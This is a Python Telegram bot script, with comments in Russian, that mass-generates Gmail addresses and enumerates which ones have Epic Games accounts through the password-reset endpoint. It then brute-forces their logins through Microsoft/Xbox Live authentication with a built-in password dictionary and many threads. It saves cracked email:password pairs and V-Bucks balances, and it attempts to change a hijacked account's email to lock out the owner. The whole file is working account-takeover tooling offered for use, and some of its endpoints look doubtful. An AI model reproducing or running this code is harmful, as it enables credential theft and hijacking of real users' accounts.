#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import logging
import time
import threading
import queue
import re
import random
import string
import requests
import json
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message, FSInputFile
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [123456789]  # ваш Telegram ID

THREADS = 25
TIMEOUT = 12
DELAY_BETWEEN_ATTEMPTS = 0.2

MASS_GENERATE_COUNT = 20000
MASS_CHECK_THREADS = 200
MASS_BRUTE_THREADS = 150
MASS_BRUTE_TIMEOUT = 20
MASS_SAVE_INTERVAL = 100

# ================== ГЕНЕРАЦИЯ СЛОВАРЯ ПАРОЛЕЙ ==================
BASE_WORDS = [
    "password", "qwerty", "admin", "root", "toor", "ubuntu", "linux", "kali", "parrot",
    "blackbox", "research", "fortnite", "epicgames", "battle", "royale", "gaming",
    "winning", "legend", "dragon", "killer", "master", "michael", "jordan", "jennifer",
    "thomas", "charlie", "robert", "daniel", "jessica", "michelle", "amanda", "ashley",
    "nicole", "matthew", "andrew", "george", "joshua", "taylor", "ranger", "hunter",
    "buster", "soccer", "hockey", "baseball", "football", "superman", "batman", "starwars",
    "computer", "internet", "network", "security", "password1", "qwerty123", "admin123",
    "root123", "12345678", "123456789", "987654321", "11111111", "00000000"
]

SPECIALS = ["!", "@", "#", "$", "%", "^", "&", "*", "?"]
DIGITS = "0123456789"

def generate_password_variations(base_word):
    variations = set()
    for d in DIGITS:
        variations.add(base_word + d)
        variations.add(base_word + d + "!")
        variations.add(base_word + "!" + d)
        variations.add(base_word.capitalize() + d)
    for s in SPECIALS:
        variations.add(base_word + s)
        variations.add(s + base_word)
        variations.add(base_word + s + "1")
        variations.add("1" + s + base_word)
    leet_map = {'a':'4', 'e':'3', 'i':'1', 'o':'0', 's':'5', 't':'7'}
    leet_word = ''.join(leet_map.get(c, c) for c in base_word)
    variations.add(leet_word + "!")
    variations.add(leet_word + "123")
    variations.add(base_word + base_word)
    variations.add(base_word + base_word + "1")
    for year in ["2023","2024","2025","2026"]:
        variations.add(base_word + year)
        variations.add(year + base_word)
        variations.add(base_word.capitalize() + year + "!")
    return [p for p in variations if len(p) >= 8]

BUILTIN_PASSWORDS = []
for word in BASE_WORDS:
    BUILTIN_PASSWORDS.extend(generate_password_variations(word))
BUILTIN_PASSWORDS = sorted(set(BUILTIN_PASSWORDS))
EXTRA = [
    "Password123!", "Qwerty123!", "Admin2026!", "Root@2026",
    "Fortnite@123", "EpicGames2026", "BattleRoyal!", "Gaming@2025",
    "!QAZ2wsx", "1qazxsw2", "QAZwsx123", "!@#123qwe", "P@ssw0rd2026"
]
BUILTIN_PASSWORDS.extend(EXTRA)
BUILTIN_PASSWORDS = sorted(set(BUILTIN_PASSWORDS))
print(f"[+] Сгенерировано {len(BUILTIN_PASSWORDS)} паролей.")

# ================== ГЕНЕРАТОРЫ EMAIL ==================
EMAIL_PREFIXES = [
    "user", "player", "gamer", "shadow", "killer", "master", "legend", "dragon",
    "night", "storm", "phantom", "vortex", "crystal", "blaze", "frost", "venom",
    "ranger", "hunter", "warrior", "sniper", "ninja", "pirate", "ghost", "wolf",
    "eagle", "falcon", "tiger", "bear", "panda", "koala", "slayer"
]

def generate_random_email_auto():
    prefix = random.choice(EMAIL_PREFIXES)
    suffix = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    return f"{prefix}{suffix}@gmail.com"

def generate_unique_emails(count):
    emails = set()
    while len(emails) < count:
        emails.add(generate_random_email_auto())
    return list(emails)

# ================== ЛОГИРОВАНИЕ ==================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# ================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==================
is_running = False
stop_flag = False
mass_status = {}

# ================== ФУНКЦИИ РАБОТЫ С EPIC API ==================
def get_session():
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/json'
    })
    return session

def microsoft_auth(email, password):
    session = get_session()
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
        "grant_type": "password"
    }
    try:
        resp = session.post(url, data=data, timeout=TIMEOUT)
        if resp.status_code != 200:
            return None, f"auth_failed_{resp.status_code}"
        token_data = resp.json()
        if 'access_token' not in token_data:
            return None, "no_token"
        xbl_url = "https://user.auth.xboxlive.com/user/authenticate"
        xbl_payload = {
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }
        xbl_resp = session.post(xbl_url, json=xbl_payload, timeout=TIMEOUT)
        if xbl_resp.status_code != 200:
            return None, "xbl_failed"
        xbl_data = xbl_resp.json()
        xbl_token = xbl_data.get('Token')
        xsts_url = "https://xsts.auth.xboxlive.com/xsts/authorize"
        xsts_payload = {
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
            "RelyingParty": "http://spartacertificate.epicgames.com",
            "TokenType": "JWT"
        }
        xsts_resp = session.post(xsts_url, json=xsts_payload, timeout=TIMEOUT)
        if xsts_resp.status_code != 200:
            return None, "xsts_failed"
        xsts_data = xsts_resp.json()
        user_hash = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        token = xsts_data.get('Token')
        return {'user_hash': user_hash, 'token': token}, "success"
    except Exception as e:
        return None, f"error_{str(e)}"

def check_fortnite(user_hash, token):
    session = get_session()
    url = "https://spartacertificate.epicgames.com/api/v2/account"
    headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
    try:
        resp = session.get(url, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            return {
                'full_access': True,
                'account_id': data.get('accountId'),
                'display_name': data.get('displayName'),
                'country': data.get('country'),
                'vbucks': data.get('currency', {}).get('vbucks', 0),
                'email': data.get('email', 'not_visible')
            }
        elif resp.status_code == 403:
            return {'full_access': False, 'reason': 'locked'}
        else:
            return {'full_access': False, 'reason': f'http_{resp.status_code}'}
    except Exception as e:
        return {'full_access': False, 'reason': str(e)}

def change_email(user_hash, token, new_email, password):
    session = get_session()
    url = "https://spartacertificate.epicgames.com/api/v2/account/email"
    headers = {
        "Authorization": f"XBL3.0 x={user_hash};{token}",
        "Content-Type": "application/json"
    }
    payload = {
        "newEmail": new_email,
        "password": password
    }
    try:
        resp = session.post(url, json=payload, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            return True, "Email изменён успешно."
        elif resp.status_code == 400:
            return False, "Ошибка: неверный пароль или email уже используется."
        elif resp.status_code == 403:
            return False, "Доступ запрещён (возможно, требуется 2FA)."
        else:
            return False, f"HTTP {resp.status_code}: {resp.text[:100]}"
    except Exception as e:
        return False, f"Ошибка соединения: {str(e)}"

# ================== ФУНКЦИИ ДЛЯ МАССОВЫХ ПРОВЕРОК ==================
def check_account_exists(email):
    session = get_session()
    reset_url = "https://www.epicgames.com/account/v2/password/reset"
    data = {"email": email}
    try:
        resp = session.post(reset_url, json=data, timeout=10)
        return resp.status_code == 200
    except:
        return False

def attempt_login(email, password):
    auth_result, status = microsoft_auth(email, password)
    if status != "success" or auth_result is None:
        return None, status
    user_hash = auth_result.get('user_hash')
    token = auth_result.get('token')
    if not user_hash or not token:
        return None, "missing_credentials"
    account_info = check_fortnite(user_hash, token)
    if account_info.get('full_access', False):
        return {'user_hash': user_hash, 'token': token, 'account': account_info}, "success"
    else:
        return None, account_info.get('reason', 'unknown')

def brute_worker(email, passwords, timeout_sec):
    start = time.time()
    for pwd in passwords:
        if time.time() - start > timeout_sec:
            return None, "timeout"
        result, status = attempt_login(email, pwd)
        if result is not None and result.get('account', {}).get('full_access', False):
            return (pwd, result['account']), "found"
    return None, "not_found"

# ================== ОБРАБОТЧИКИ КОМАНД ==================
def extract_emails(text):
    return re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    await message.answer(
        f"🤖 <b>Fortnite Ultimate BruteBot + Auto Mass</b>\n\n"
        f"📚 Словарь: <b>{len(BUILTIN_PASSWORDS)}</b> паролей\n"
        f"🔧 Команды:\n"
        f"   /bruteforce email — проверка указанного email\n"
        f"   /auto — автоматический подбор (по одному email)\n"
        f"   /auto_mass [количество] — сгенерировать и проверить массу email (по умолчанию 20000)\n"
        f"   /auto_mass_stop — остановить массовый процесс\n"
        f"   /auto_mass_status — статус массового процесса\n"
        f"   /show_found — показать все взломанные аккаунты (почта:пароль)\n"
        f"   /stop — остановить текущий процесс\n"
        f"   /status — статус"
    )

@dp.message(Command("show_found"))
async def cmd_show_found(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if not os.path.exists("found_passwords.txt"):
        await message.answer("❌ Файл с найденными аккаунтами не найден.")
        return
    with open("found_passwords.txt", "r", encoding='utf-8') as f:
        lines = f.readlines()
    if not lines:
        await message.answer("❌ Нет найденных аккаунтов.")
        return
    pairs = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            if ' |' in line:
                pair = line.split(' |')[0]
                pairs.append(pair)
            else:
                pairs.append(line)
    content = '\n'.join(pairs)
    if not content:
        await message.answer("❌ Нет данных в формате email:password.")
        return
    if len(content) > 4000:
        temp_file = "temp_pairs.txt"
        with open(temp_file, "w", encoding='utf-8') as f:
            f.write(content)
        await message.answer_document(FSInputFile(temp_file), caption="📋 Все взломанные аккаунты (email:password)")
        os.remove(temp_file)
    else:
        await message.answer(f"📋 Все взломанные аккаунты:\n<code>{content}</code>", parse_mode=ParseMode.HTML)

@dp.message(Command("auto_mass"))
async def cmd_auto_mass(message: Message):
    global is_running, stop_flag, mass_status
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    args = message.text.split()
    count = MASS_GENERATE_COUNT
    if len(args) > 1:
        try:
            count = int(args[1])
            if count < 1:
                count = 1
            if count > 100000:
                count = 100000
        except:
            pass
    await message.answer(f"🚀 Генерация {count} случайных email...")
    emails = generate_unique_emails(count)
    await message.answer(f"✅ Сгенерировано {len(emails)} email. Начинаем массовую проверку.")
    mass_status = {"total": len(emails), "checked": 0, "existing": 0, "found": 0}
    await start_mass_bruteforce(message, emails)

async def start_mass_bruteforce(message, emails):
    global is_running, stop_flag, mass_status
    is_running = True
    stop_flag = False
    total = len(emails)
    progress_msg = await message.answer(f"⏳ Проверка существования {total} email...")
    
    with open("generated_emails.txt", "w", encoding='utf-8') as f:
        f.write("\n".join(emails))
    
    exists_results = {}
    check_lock = threading.Lock()
    def check_worker(email):
        if stop_flag:
            return
        exists = check_account_exists(email)
        return email, exists
    
    with ThreadPoolExecutor(max_workers=MASS_CHECK_THREADS) as executor:
        futures = [executor.submit(check_worker, email) for email in emails]
        completed = 0
        for future in as_completed(futures):
            if stop_flag:
                executor.shutdown(wait=False)
                break
            email, exists = future.result()
            with check_lock:
                completed += 1
                mass_status["checked"] = completed
                if exists:
                    exists_results[email] = None
                    mass_status["existing"] = len(exists_results)
                if completed % 100 == 0:
                    asyncio.create_task(
                        progress_msg.edit_text(
                            f"⏳ Проверка существования: {completed}/{total} ({completed/total*100:.1f}%)\n"
                            f"🔍 Найдено аккаунтов: {len(exists_results)}"
                        )
                    )
    
    if stop_flag:
        await progress_msg.edit_text("⏹️ Остановлено.")
        is_running = False
        return
    
    existing = list(exists_results.keys())
    if existing:
        with open("existing_accounts.txt", "w", encoding='utf-8') as f:
            f.write("\n".join(existing))
    else:
        await message.answer("❌ Не найдено ни одного существующего аккаунта.")
        is_running = False
        await progress_msg.edit_text("✅ Завершено (аккаунтов нет).")
        return
    
    await progress_msg.edit_text(f"✅ Найдено {len(existing)} существующих аккаунтов. Начинаем брутфорс...")
    
    found_results = {}
    found_count = 0
    lock = threading.Lock()
    passwords = BUILTIN_PASSWORDS
    
    def brute_worker_email(email):
        nonlocal found_count
        if stop_flag:
            return
        result, status = brute_worker(email, passwords, MASS_BRUTE_TIMEOUT)
        if result is not None:
            pwd, acc = result
            with lock:
                found_results[email] = (pwd, acc)
                found_count += 1
                mass_status["found"] = found_count
                if found_count % MASS_SAVE_INTERVAL == 0:
                    with open("found_passwords.txt", "a", encoding='utf-8') as f:
                        f.write(f"{email}:{pwd} | ID: {acc.get('account_id')} | {acc.get('display_name')} | V-Bucks: {acc.get('vbucks', 0)}\n")
    
    with ThreadPoolExecutor(max_workers=MASS_BRUTE_THREADS) as executor:
        futures = [executor.submit(brute_worker_email, email) for email in existing]
        for future in as_completed(futures):
            if stop_flag:
                executor.shutdown(wait=False)
                break
    
    if found_results:
        with open("found_passwords.txt", "w", encoding='utf-8') as f:
            f.write(f"# Найдено {len(found_results)} аккаунтов\n")
            for email, (pwd, acc) in found_results.items():
                f.write(f"{email}:{pwd} | ID: {acc.get('account_id')} | {acc.get('display_name')} | V-Bucks: {acc.get('vbucks', 0)}\n")
        await message.answer_document(FSInputFile("found_passwords.txt"), caption=f"Найдено {len(found_results)} аккаунтов")
    else:
        await message.answer("❌ Ни один из существующих аккаунтов не взломан (пароли не подошли).")
    
    await progress_msg.edit_text(f"✅ Завершено. Всего: {total}, существующих: {len(existing)}, найдено: {len(found_results)}")
    is_running = False

@dp.message(Command("auto_mass_stop"))
async def cmd_auto_mass_stop(message: Message):
    global stop_flag
    if message.from_user.id not in ADMIN_IDS:
        return
    if not is_running:
        await message.answer("ℹ️ Нет активного массового процесса.")
        return
    stop_flag = True
    await message.answer("⏹️ Остановка массового процесса...")

@dp.message(Command("auto_mass_status"))
async def cmd_auto_mass_status(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    if not is_running:
        await message.answer("🔴 Массовый процесс не запущен.")
        return
    await message.answer(
        f"📊 Статус:\n"
        f"Всего email: {mass_status.get('total', 0)}\n"
        f"Проверено на существование: {mass_status.get('checked', 0)}\n"
        f"Найдено аккаунтов: {mass_status.get('existing', 0)}\n"
        f"Найдено паролей: {mass_status.get('found', 0)}"
    )

@dp.message(Command("bruteforce"))
async def cmd_bruteforce(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("❌ Укажите email: /bruteforce target@example.com")
        return
    email = args[1].strip()
    if not re.match(r'[^@]+@[^@]+\.[^@]+', email):
        await message.answer("❌ Некорректный email.")
        return
    new_email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com"
    await message.answer(f"🔐 Будет попытка сменить почту на <b>{new_email}</b>")
    await start_bruteforce(message, email, new_email)

@dp.message(Command("auto"))
async def cmd_auto(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    await message.answer("🚀 Автоматический режим: генерация email и перебор до первого успеха.")
    await start_auto_bruteforce(message)

@dp.message(Command("stop"))
async def cmd_stop(message: Message):
    global is_running, stop_flag
    if message.from_user.id not in ADMIN_IDS:
        return
    if not is_running:
        await message.answer("ℹ️ Нет активного процесса.")
        return
    stop_flag = True
    await message.answer("⏹️ Остановка...")

@dp.message(Command("status"))
async def cmd_status(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    await message.answer("🟢 Активен" if is_running else "🔴 Ожидание")

@dp.message()
async def handle_text(message: Message):
    global is_running
    if message.from_user.id not in ADMIN_IDS:
        return
    if is_running:
        await message.answer("⏳ Уже идёт процесс. /stop для остановки.")
        return
    emails = extract_emails(message.text)
    if not emails:
        await message.answer("❌ Email не найден.")
        return
    email = emails[0]
    new_email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}@gmail.com"
    await message.answer(f"🔐 Будет попытка сменить почту на <b>{new_email}</b>")
    await start_bruteforce(message, email, new_email)

async def start_bruteforce(message, email, new_email):
    global is_running, stop_flag
    is_running = True
    stop_flag = False
    passwords = BUILTIN_PASSWORDS
    progress_msg = await message.answer(f"🚀 Запуск брутфорса для {email}\n📚 Словарь: {len(passwords)}")
    def progress_callback(checked, total_pw, current_pw):
        asyncio.create_task(
            progress_msg.edit_text(
                f"⏳ {checked}/{total_pw} ({checked/total_pw*100:.1f}%)\n"
                f"🔑 {current_pw[:25]}..."
            )
        )
    try:
        results, elapsed, found = await asyncio.to_thread(
            run_bruteforce, email, passwords, progress_callback, new_email
        )
        if found:
            success = next((r for r in results if r.get('result') and r['result'].get('account', {}).get('full_access')), None)
            if success:
                account = success['result']['account']
                password = success['password']
                email_change = success.get('email_change', {})
                msg = (
                    f"✅ <b>АККАУНТ НАЙДЕН!</b>\n"
                    f"📧 Старая почта: {email}\n"
                    f"🔑 Пароль: <code>{password}</code>\n"
                    f"🆔 ID: {account.get('account_id')}\n"
                    f"👤 Имя: {account.get('display_name')}\n"
                    f"💎 V-Bucks: {account.get('vbucks', 0)}\n"
                    f"⏱️ {elapsed:.2f} сек\n"
                )
                if email_change and email_change.get('success'):
                    msg += f"✅ Почта изменена на: <b>{email_change['new_email']}</b>\n"
                    msg += f"📝 Сообщение: {email_change['msg']}"
                else:
                    msg += f"❌ Смена почты не удалась: {email_change.get('msg', 'неизвестная ошибка (возможно, требуется подтверждение по старой почте)')}"
                await message.answer(msg)
            else:
                await message.answer(f"❌ {email}: пароль не найден.")
        else:
            await message.answer(f"❌ {email}: перебрано {len(results)} вариантов, успеха нет.")
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)}")
    is_running = False
    await progress_msg.edit_text("✅ Завершено.")

async def start_auto_bruteforce(message):
    global is_running, stop_flag
    is_running = True
    stop_flag = False
    passwords = BUILTIN_PASSWORDS
    checked_emails = set()
    progress_msg = await message.answer("⏳ Генерация email...")
    attempt_count = 0
    while not stop_flag:
        email = generate_random_email_auto()
        if email in checked_emails:
            continue
        checked_emails.add(email)
        attempt_count += 1
        await progress_msg.edit_text(
            f"🔍 Попытка #{attempt_count}\n"
            f"📧 {email}\n"
            f"📚 Словарь: {len(passwords)} паролей\n"
            f"🔄 Перебор..."
        )
        def progress_callback(checked, total_pw, current_pw):
            asyncio.create_task(
                progress_msg.edit_text(
                    f"🔍 Попытка #{attempt_count}\n"
                    f"📧 {email}\n"
                    f"📊 {checked}/{total_pw} ({checked/total_pw*100:.1f}%)\n"
                    f"🔑 {current_pw[:25]}..."
                )
            )
        try:
            results, elapsed, found = await asyncio.to_thread(
                run_bruteforce, email, passwords, progress_callback, None
            )
            if found:
                success = next((r for r in results if r.get('result') and r['result'].get('account', {}).get('full_access')), None)
                if success:
                    account = success['result']['account']
                    password = success['password']
                    msg = (
                        f"✅ <b>АККАУНТ НАЙДЕН!</b>\n"
                        f"📧 Email: {email}\n"
                        f"🔑 Пароль: <code>{password}</code>\n"
                        f"🆔 ID: {account.get('account_id')}\n"
                        f"👤 Имя: {account.get('display_name')}\n"
                        f"💎 V-Bucks: {account.get('vbucks', 0)}\n"
                        f"⏱️ {elapsed:.2f} сек"
                    )
                    await message.answer(msg)
                    break
            else:
                continue
        except Exception as e:
            await message.answer(f"⚠️ Ошибка при {email}: {str(e)}")
            continue
    is_running = False
    await progress_msg.edit_text("⏹️ Процесс остановлен." if stop_flag else "✅ Автоподбор завершён.")

# ================== БРУТФОРС С ОБРАБОТКОЙ РЕЗУЛЬТАТА ==================
def worker_bruteforce(email, password_queue, result_queue, stop_event, found_flag):
    while not stop_event.is_set() and not found_flag.is_set():
        try:
            password = password_queue.get(timeout=1)
        except queue.Empty:
            break
        if found_flag.is_set():
            break
        result, status = attempt_login(email, password)
        result_queue.put({'password': password, 'status': status, 'result': result})
        if result is not None and result.get('account', {}).get('full_access', False):
            found_flag.set()
            break
        time.sleep(DELAY_BETWEEN_ATTEMPTS)

def run_bruteforce(email, passwords, progress_callback, new_email=None):
    found_flag = threading.Event()
    stop_event = threading.Event()
    password_queue = queue.Queue()
    for p in passwords:
        password_queue.put(p)
    result_queue = queue.Queue()
    results = []
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [
            executor.submit(worker_bruteforce, email, password_queue, result_queue, stop_event, found_flag)
            for _ in range(THREADS)
        ]
        total = len(passwords)
        checked = 0
        while not all(f.done() for f in futures):
            while not result_queue.empty():
                res = result_queue.get()
                checked += 1
                results.append(res)
                if res.get('result') is not None and res['result'].get('account', {}).get('full_access', False):
                    found_flag.set()
                    stop_event.set()
                    if new_email:
                        user_hash = res['result'].get('user_hash')
                        token = res['result'].get('token')
                        password = res['password']
                        success, msg = change_email(user_hash, token, new_email, password)
                        res['email_change'] = {'success': success, 'new_email': new_email, 'msg': msg}
                    else:
                        res['email_change'] = None
                if checked % 10 == 0:
                    progress_callback(checked, total, res.get('password', ''))
            if stop_flag:
                stop_event.set()
                break
            time.sleep(0.5)
        for f in futures:
            f.cancel()
    elapsed = time.time() - start_time
    return results, elapsed, found_flag.is_set()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
